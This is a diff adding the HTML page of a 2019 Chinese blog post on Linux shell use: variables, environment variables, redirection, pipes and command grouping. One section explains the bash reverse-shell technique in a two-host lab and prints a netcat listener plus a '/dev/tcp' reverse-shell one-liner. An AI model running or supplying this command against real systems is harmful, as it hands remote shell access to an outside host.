@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="description" content="linux中的shell使用">
+
+
+
+
+  <meta name="keywords" content="linux,">
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Hades">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1">
+
+
+
+<link rel="canonical" href="http://yoursite.com/2019/08/13/linux中的shell使用/">
+
+
+<meta name="description" content="1.Shell变量的分类内部变量： 系统提供，用户只能使用不能修改。 环境变量： 决定了用户的工作的环境，不需要定义可直接在shell中使用，某些可修改。 用户变量 用户建立和修改，也称为用户自定义变量。 2.Shell中变量的定义和输出格式：name=string name为变量名，以字母或下划线开头的字母、数字和下换线字符序列。 “=”为赋值符号，两边不能直接跟空格，否则shell将视为命令。">
+<meta name="keywords" content="linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux中的shell使用">
+<meta property="og:url" content="http://yoursite.com/2019/08/13/linux中的shell使用/index.html">
+<meta property="og:site_name" content="Hades">
+<meta property="og:description" content="1.Shell变量的分类内部变量： 系统提供，用户只能使用不能修改。 环境变量： 决定了用户的工作的环境，不需要定义可直接在shell中使用，某些可修改。 用户变量 用户建立和修改，也称为用户自定义变量。 2.Shell中变量的定义和输出格式：name=string name为变量名，以字母或下划线开头的字母、数字和下换线字符序列。 “=”为赋值符号，两边不能直接跟空格，否则shell将视为命令。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/5.png">
+<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/6.png">
+<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/7.png">
+<meta property="og:updated_time" content="2019-08-13T12:16:02.627Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="linux中的shell使用">
+<meta name="twitter:description" content="1.Shell变量的分类内部变量： 系统提供，用户只能使用不能修改。 环境变量： 决定了用户的工作的环境，不需要定义可直接在shell中使用，某些可修改。 用户变量 用户建立和修改，也称为用户自定义变量。 2.Shell中变量的定义和输出格式：name=string name为变量名，以字母或下划线开头的字母、数字和下换线字符序列。 “=”为赋值符号，两边不能直接跟空格，否则shell将视为命令。">
+<meta name="twitter:image" content="http://pw5q6scnw.bkt.clouddn.com/5.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
+<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+
+
+  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css">
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: ture
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> linux中的shell使用 - Hades </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Hades</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          linux中的shell使用
+        
+      </h1>
+
+      <time class="post-time">
+          8月 13 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h3 id="1-Shell变量的分类"><a href="#1-Shell变量的分类" class="headerlink" title="1.Shell变量的分类"></a>1.Shell变量的分类</h3><p>内部变量：</p>
+<p>系统提供，用户只能使用不能修改。</p>
+<p>环境变量：</p>
+<p>决定了用户的工作的环境，不需要定义可直接在shell中使用，某些可修改。</p>
+<p>用户变量</p>
+<p>用户建立和修改，也称为用户自定义变量。</p>
+<h3 id="2-Shell中变量的定义和输出"><a href="#2-Shell中变量的定义和输出" class="headerlink" title="2.Shell中变量的定义和输出"></a>2.Shell中变量的定义和输出</h3><p>格式：<code>name=string</code></p>
+<p>name为变量名，以字母或下划线开头的字母、数字和下换线字符序列。</p>
+<p>“=”为赋值符号，两边不能直接跟空格，否则shell将视为命令。</p>
+<p>string是被赋予的变量值，若string中包含空格、制表符和换行符，则string必须用’string’或”string”的形式，双引号允许变量替换，单引号不允许。</p>
+<p>通常在变量名前加$符号引用变量的值，变量的输出可使用shell的内置命令echo或printf。</p>
+<p>可以属于unset命令取消shell变量的声明</p>
+<h3 id="3-Shell变量的作用域"><a href="#3-Shell变量的作用域" class="headerlink" title="3.Shell变量的作用域"></a>3.Shell变量的作用域</h3><p>局部变量：</p>
+<p>作用范围仅限制在其命令行所在的shell或当前shell脚本执行过程中。</p>
+<p>全局变量：</p>
+<p>作用范围包含定义该变量的shell以及其所有子shell。</p>
+<h3 id="4-Shell环境变量"><a href="#4-Shell环境变量" class="headerlink" title="4.Shell环境变量"></a>4.Shell环境变量</h3><p>环境变量定义shell的运行环境，shell用环境变量来确定查找路径、注册目录、终端类型、终端名称、用户名等。</p>
+<table>
+<thead>
+<tr>
+<th>环境变量名</th>
+<th>说明</th>
+<th>环境变量名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>BASH</td>
+<td>bash的完整路径名</td>
+<td>PATH</td>
+<td>bash寻找看执行文件的搜索路径</td>
+</tr>
+<tr>
+<td>EDITOP</td>
+<td>应用程序中默认使用的编辑器</td>
+<td>ENV</td>
+<td>linux查找配置文件的路径</td>
+</tr>
+<tr>
+<td>HISTFILE</td>
+<td>用于储存历史命令的文化</td>
+<td>PS1</td>
+<td>命令行的一级提示符</td>
+</tr>
+<tr>
+<td>HISTSIZE</td>
+<td>历史命令列表的大小</td>
+<td>PS2</td>
+<td>命令行的二级提示符</td>
+</tr>
+<tr>
+<td>HOME</td>
+<td>当前用户的用户目录</td>
+<td>PWD</td>
+<td>当前工作目录</td>
+</tr>
+<tr>
+<td>OLDPWD</td>
+<td>前一个工作目录</td>
+<td>USER</td>
+<td>当前用户名</td>
+</tr>
+<tr>
+<td>IFS</td>
+<td>用于分割命令行参数的分割符</td>
+<td>UID</td>
+<td>当前用户的uid</td>
+</tr>
+<tr>
+<td>SECONDS</td>
+<td>当前shell开始后流逝的秒数</td>
+<td>TERM</td>
+<td>当前用户的终端类型</td>
+</tr>
+</tbody></table>
+<h3 id="5-重定向-bash反弹shell原理"><a href="#5-重定向-bash反弹shell原理" class="headerlink" title="5.重定向/ bash反弹shell原理"></a>5.重定向/ bash反弹shell原理</h3><p>所谓重定向，就是不使用系统的标准输入端口、标准输出端口或标准错误端口，而进行重新的指定。</p>
+<p>标准设备</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>代号</th>
+<th>代表意思</th>
+<th>设备</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>STDIN</td>
+<td>0</td>
+<td>标准输入</td>
+<td>键盘</td>
+<td>命令在执行时所要的输入数据通过它来取得</td>
+</tr>
+<tr>
+<td>STDOUT</td>
+<td>1</td>
+<td>标准输出</td>
+<td>显示器</td>
+<td>命令执行后的输出结果从该端口送出</td>
+</tr>
+<tr>
+<td>STDERR</td>
+<td>2</td>
+<td>标准错误</td>
+<td>显示器</td>
+<td>命令执行时的错误信息通过该端口送出</td>
+</tr>
+</tbody></table>
+<p>重定向符</p>
+<table>
+<thead>
+<tr>
+<th>重定向符</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&lt;</td>
+<td>实现输入重定向。</td>
+</tr>
+<tr>
+<td>&lt;&lt;!……!</td>
+<td>实现输入重定向的特例，即here文件。</td>
+</tr>
+<tr>
+<td>&gt;或&gt;&gt;</td>
+<td>实现输出重定向，&gt;实现覆盖式输出重定向，&gt;&gt;实现追加式输出重定向</td>
+</tr>
+<tr>
+<td>2&gt;或2&gt;&gt;</td>
+<td>实现错误重定向。</td>
+</tr>
+<tr>
+<td>&amp;&gt;</td>
+<td>同时实现输出重定向或错误重定向。</td>
+</tr>
+</tbody></table>
+<p>了解了上面这些，我们来看一下利用重定向在linux下反弹shell的原理。</p>
+<p>Kail linux 192.168.3.79</p>
+<p>Centos7   192.168.3.83</p>
+<p>nc： TCP/IP 协议中的swiss army knife，是一个使用tcp或udp协议通过网络连接来读取数据的一个工具。</p>
+<p>bash：unix shell  参数 -i创建一个交互式的bash</p>
+<p>如果我们不使用输出重定向，echo输出的字符会显示在本地的屏幕上。</p>
+<p><img src="http://pw5q6scnw.bkt.clouddn.com/5.png" alt="1"></p>
+<p>在kail下开启端口监听  <code>nc -lvp 9999</code> ，然后我们使用输出重定向符将字符输出到kail的显示屏上。加上bash -i 以后我们在192.168.3.79和192.168.3.83之间建立了一个交互式的bash，将192.168.3.83的输出重定向到了192.168.3.79。</p>
+<p><img src="http://pw5q6scnw.bkt.clouddn.com/6.png" alt="2"></p>
+<p>接下来尝试一下从192.168.3.79输入重定向到192.168.3.83。</p>
+<p><img src="http://pw5q6scnw.bkt.clouddn.com/7.png" alt="3"></p>
+<p>知道了输入重定向和输出重定向的原理，把这两个结合其他，就实现了shell的反弹。</p>
+<p><code>nc -lvp 9999</code>  <code>bash -i &amp;&gt; /dev/tcp/192.168.3.79/9999 0&lt;&amp;1</code></p>
+<p>kail本地监听端口9999，centos输入重定向到192.168.3.79，输出也重定向到192.168.3.79。就相当于centos的命令输入、显示结果都在192.168.3.79的终端屏幕上。也就实现了shell的反弹。</p>
+<h3 id="6-管道-命令替换-命令组合"><a href="#6-管道-命令替换-命令组合" class="headerlink" title="6.管道/命令替换/命令组合"></a>6.管道/命令替换/命令组合</h3><p>管道：</p>
+<p>管道线中的每一条命令作为一个单独的进程运行，前一个命令的输出作为下一个命名的输入。单向，从左到右顺序执行。</p>
+<p>格式：命令1|命令2|…….</p>
+<p>命令替换：</p>
+<p>shell中的命令参数可以由另一个命令执行的结果替代。</p>
+<p>格式：$cmd1<code>cmd2 arguments</code>      $cmd1 $(cmd2 arguments)</p>
+<p>命令组合：</p>
+<p>在一个命令行上使用若干shell的元字符将若干命令组合在一起。</p>
+<table>
+<thead>
+<tr>
+<th>命令行形式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CMD1;CMD2</td>
+<td>顺序执行一组命令序列</td>
+</tr>
+<tr>
+<td>{MD1;MD2;}</td>
+<td>在当前shell中执行一组命令序列</td>
+</tr>
+<tr>
+<td>(CMD1;CMD2)</td>
+<td>在子shell 中执行一组命令序列</td>
+</tr>
+<tr>
+<td>CMD1&amp;&amp;CMD</td>
+<td>与逻辑，CMD1成功才执行2</td>
+</tr>
+<tr>
+<td>CMD1||CMD2</td>
+<td>或逻辑，CMD1失败才执行2</td>
+</tr>
+</tbody></table>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/linux/">linux</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2019/08/13/渗透测试中的工具利用/">
+        <span class="next-text nav-default">渗透测试中的工具利用</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2019
+    <span class="footer-author">Hades.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+  
+
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tororo"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
